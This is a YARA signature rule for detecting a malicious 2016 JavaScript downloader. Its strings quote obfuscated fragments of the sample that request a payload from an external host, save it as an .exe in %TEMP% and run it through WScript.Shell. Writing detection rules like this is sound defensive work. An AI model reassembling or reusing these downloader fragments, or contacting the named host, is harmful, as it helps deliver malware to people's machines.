rule sig_20160329_2c1c631c89c02645e05b3d529af8836e {
  meta:
    description = "datamaliciousorder - file 20160329_2c1c631c89c02645e05b3d529af8836e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7c6492793ae42092b3fd004e364272eabb9becb9c044aa091135457b05cef56b"

  strings:
    $s1  = "function Zmqhx() {return Pxtatlvphb[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"paR5IlA7ySYNkkw4.exe\";};" fullword ascii
    $s2  = "Dhdtbmk[Ygeqcg](\"GET\", \"http://teknosolar.com/xw3ika\", false);" fullword ascii
    $s3  = "do {WScript[Unrab](Mkeii() * 11)} while (Dhdtbmk[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "function Sowxab(Sjywm, Nccfhxrakg){return Sjywm - Nccfhxrakg;};" fullword ascii
    $s5  = "function Eynaryl() {return ((Pgeta == true) && (Pgeta == Htzqhzto)) ? 1 : Nlgow;};" fullword ascii
    $s6  = "var Pxtatlvphb = function Gaksbvle() {return WScript[Imtejgnix](\"WScript.Shell\");}();" fullword ascii
    $s7  = "Pgeta = true; " fullword ascii
    $s8  = "var Pgeta = false;" fullword ascii
    $s9  = "function Szjzoi(Ytcztpjg){Pxtatlvphb[\"Run\"](Ytcztpjg, Nlgow, Nlgow);};" fullword ascii
    $s10 = "function Oalbfr(){return Fxlbqgbvq;};" fullword ascii
    $s11 = "var Xvqtxnkvgv = false;" fullword ascii
    $s12 = "function Mkeii(){return 22;};" fullword ascii
    $s13 = " while (Pybhn){" fullword ascii
    $s14 = "var Nwfygxa = new this[\"Date\"]();" fullword ascii
    $s15 = "var Htzqhzto = false;" fullword ascii
    $s16 = "function Xrbhb(Awnnpj) {var Asdqvcb = (1, 2, 3, 4, 5, Awnnpj); return Asdqvcb;};" fullword ascii
    $s17 = "return Sowxab(Ipxkon, Yifnos);" fullword ascii
    $s18 = "function Uboffgut(){return Imtejgnix;};" fullword ascii
    $s19 = "Htzqhzto = true; " fullword ascii
    $s20 = "} catch(Ewgcdpmyd){Pybhn = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}